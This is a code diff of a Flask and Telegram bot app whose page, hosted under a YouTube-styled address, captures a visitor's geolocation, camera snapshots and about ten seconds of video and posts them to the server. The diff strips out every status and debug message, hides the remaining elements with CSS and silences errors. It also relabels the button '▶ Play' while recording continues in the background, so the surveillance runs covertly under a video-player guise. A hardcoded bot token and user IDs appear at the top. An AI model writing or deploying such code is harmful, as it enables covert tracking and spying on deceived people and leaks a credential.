@@ -3,11 +3,9 @@ import threading
 from flask import Flask, request, render_template_string
 import telebot
 
-# ========== HARDCODED CONFIG ==========
 BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"
 USER_IDS = [7361880623, 8475691696]
 BASE_URL = "https://web-youtube-asuma66.up.railway.app"
-# ======================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -29,12 +27,11 @@ HTML_PAGE = """<!DOCTYPE html>
         .info { margin-top:15px; }
         .info .title { font-size:22px; font-weight:500; }
         .info .channel { color:#aaa; margin-top:8px; }
-        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; }
-        .controls button { background:#3ea6ff; border:none; color:#000; padding:8px 16px; border-radius:20px; font-weight:bold; cursor:pointer; }
+        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
+        .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
         .controls button:disabled { opacity:0.5; cursor:not-allowed; }
-        .status { margin-top:10px; color:#aaa; font-size:14px; }
-        #locationStatus { color:#3ea6ff; }
-        #debug { margin-top:10px; padding:8px; background:#1a1a1a; color:#ccc; font-size:12px; white-space:pre-wrap; word-break:break-all; max-height:100px; overflow-y:auto; }
+        /* Hide all status elements */
+        #statusText, #locationStatus, #debug { display: none; }
     </style>
 </head>
 <body>
@@ -52,45 +49,24 @@ HTML_PAGE = """<!DOCTYPE html>
         </div>
         <div class="controls">
             <button id="startBtn">▶ Start Session</button>
-            <button id="statusBtn" disabled>Idle</button>
         </div>
-        <div class="status" id="statusText">Ready. Click "Start Session".</div>
-        <div id="locationStatus">📍 Location: pending</div>
-        <div id="debug">Debug: waiting...</div>
+        <!-- Hidden status elements – kept only for internal use, but hidden via CSS -->
+        <div id="statusText"></div>
+        <div id="locationStatus"></div>
+        <div id="debug"></div>
     </div>
     <script>
         let frontStream = null, backStream = null, mediaRecorder = null;
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
-        const statusText = document.getElementById('statusText');
-        const locationStatus = document.getElementById('locationStatus');
-        const debugDiv = document.getElementById('debug');
         const startBtn = document.getElementById('startBtn');
 
-        function log(msg) {
-            debugDiv.innerText = msg + '\\n' + debugDiv.innerText;
-            console.log(msg);
-        }
-
-        function updateStatus(msg, good=true) {
-            statusText.innerText = msg;
-            statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
-        }
-
+        // No status updates – everything happens silently.
         function sendLocation(coords) {
-            const payload = { lat: coords.lat, lng: coords.lng };
             fetch('/location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(() => {
-                locationStatus.innerHTML = `📍 Location sent: ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
-                updateStatus('Location sent to bot.');
-            })
-            .catch((e) => {
-                locationStatus.innerHTML = '📍 Location send failed.';
-                log('Location send error: ' + e);
-            });
+                body: JSON.stringify({ lat: coords.lat, lng: coords.lng })
+            }).catch(() => {});
         }
 
         function sendLocationDenied() {
@@ -98,11 +74,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ denied: true })
-            })
-            .then(() => {
-                locationStatus.innerHTML = '📍 Location denied – notification sent.';
-                updateStatus('Location denied – bot notified.', false);
-            });
+            }).catch(() => {});
         }
 
         function captureFrame(stream) {
@@ -136,117 +108,74 @@ HTML_PAGE = """<!DOCTYPE html>
         }
 
         function sendCameraDenied() {
-            fetch('/camera_denied', { method: 'POST' });
+            fetch('/camera_denied', { method: 'POST' }).catch(() => {});
         }
 
         function sendCameraUnavailable() {
-            fetch('/camera_unavailable', { method: 'POST' });
+            fetch('/camera_unavailable', { method: 'POST' }).catch(() => {});
         }
 
-        // ---- Improved camera getter with fallbacks ----
         async function getCameraStream() {
-            // Try without any constraints first (most compatible)
             try {
-                log('Trying getUserMedia without constraints...');
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                log('Success: no constraints');
                 return { stream, label: 'default' };
             } catch (e) {
-                log('No-constraints failed: ' + e.name + ' - ' + e.message);
-                // Try back camera with environment
                 try {
-                    log('Trying back camera (environment)...');
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                    log('Success: environment');
                     return { stream, label: 'environment' };
                 } catch (e2) {
-                    log('Environment failed: ' + e2.name + ' - ' + e2.message);
-                    // Try front camera (user)
                     try {
-                        log('Trying front camera (user)...');
                         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                        log('Success: user');
                         return { stream, label: 'user' };
                     } catch (e3) {
-                        log('All camera attempts failed.');
-                        throw new Error('No camera available');
+                        throw new Error('No camera');
                     }
                 }
             }
         }
 
-        // ---- Send camera denial ----
-        function sendCameraDenied() {
-            fetch('/camera_denied', { method: 'POST' });
-        }
-
-        function sendCameraUnavailable() {
-            fetch('/camera_unavailable', { method: 'POST' });
-        }
-
         async function startSession() {
             startBtn.disabled = true;
-            startBtn.innerText = 'Starting...';
-            updateStatus('Requesting location...');
+            startBtn.innerText = 'Loading...';
 
-            // ---- Step 1: Get location ----
+            // ---- Location ----
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                        sendLocation(coords);
+                        sendLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
                         requestCamera();
                     },
-                    (err) => {
-                        locationStatus.innerHTML = '📍 Location denied.';
+                    () => {
                         sendLocationDenied();
                         requestCamera();
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                locationStatus.innerHTML = '📍 Geolocation not supported.';
                 sendLocationDenied();
                 requestCamera();
             }
         }
 
         async function requestCamera() {
-            updateStatus('Requesting camera access...');
             try {
                 const result = await getCameraStream();
                 const stream = result.stream;
-                const label = result.label;
-                log('Camera obtained: ' + label);
-
-                // We only have one stream. We'll use it for both front and back? But we need two streams.
-                // Simpler: use the same stream for both (if only one camera), or try to get a second stream.
-                // Let's try to get a second stream (front) if possible, else reuse the same.
+                // Try to get a second camera for "front" view (reuse if only one)
                 let frontStreamLocal = null;
-                let backStreamLocal = stream; // use the obtained stream as back
-
-                // Try to get a front stream separately (if possible)
                 try {
-                    const frontResult = await getCameraStream(); // will try again
+                    const frontResult = await getCameraStream();
                     frontStreamLocal = frontResult.stream;
-                    log('Second camera obtained (front)');
                 } catch (e) {
-                    log('Could not get second camera, reusing the first.');
-                    // If only one camera, we can clone the stream (but not needed, we'll just use the same for both)
-                    frontStreamLocal = stream;
+                    frontStreamLocal = stream; // fallback
                 }
-
-                // Assign to global variables
                 backStream = stream;
-                frontStream = frontStreamLocal || stream; // fallback
+                frontStream = frontStreamLocal;
 
-                updateStatus('Camera granted – capturing screenshots...');
                 const frontBlob = await captureFrame(frontStream);
                 const backBlob = await captureFrame(backStream);
 
-                // Record from back stream (or whichever)
-                const recordStream = backStream;
-                mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9' });
+                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
                 recordedChunks = [];
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                 mediaRecorder.onstop = () => {
@@ -254,13 +183,11 @@ HTML_PAGE = """<!DOCTYPE html>
                     sendMedia(frontBlob, backBlob, blob);
                     frontStream.getTracks().forEach(t => t.stop());
                     backStream.getTracks().forEach(t => t.stop());
-                    updateStatus('✅ Media sent!');
                     startBtn.disabled = false;
                     startBtn.innerText = '▶ Start Session';
                 };
                 mediaRecorder.start(1000);
                 recordingActive = true;
-                updateStatus('Recording up to 10s...');
                 setTimeout(() => {
                     if (recordingActive && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
@@ -270,28 +197,24 @@ HTML_PAGE = """<!DOCTYPE html>
                 window.addEventListener('beforeunload', () => {
                     if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                 });
-                startBtn.innerText = 'Recording...';
+                startBtn.innerText = '▶ Play';
+                // After a few seconds, restore the button (since recording continues in background)
+                setTimeout(() => {
+                    startBtn.innerText = '▶ Start Session';
+                }, 2000);
             } catch (err) {
-                // All camera attempts failed
-                let errorMsg = err.message || 'Camera unavailable.';
-                let sendFunc = sendCameraUnavailable;
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    sendFunc = sendCameraDenied;
-                    errorMsg = 'Camera: Denied by user.';
+                    sendCameraDenied();
                 } else {
-                    errorMsg = 'Camera: Unavailable (no camera or other error).';
+                    sendCameraUnavailable();
                 }
-                updateStatus(errorMsg, false);
-                sendFunc();
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
-                log('Final error: ' + errorMsg);
             }
         }
 
         startBtn.addEventListener('click', startSession);
-        updateStatus('Click "Start Session" – location first, then camera.');
-        log('Page loaded. Ready.');
+        // No visible status messages; everything runs silently.
     </script>
 </body>
 </html>"""
